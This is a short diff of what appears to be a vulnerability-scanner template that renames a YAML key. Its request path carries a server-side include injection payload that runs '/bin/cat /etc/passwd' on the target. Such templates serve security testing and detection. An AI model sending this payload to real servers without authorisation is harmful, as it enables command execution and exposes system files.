@@ -5,7 +5,7 @@ info:
   author: pikpikcu
   severity: high
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;"
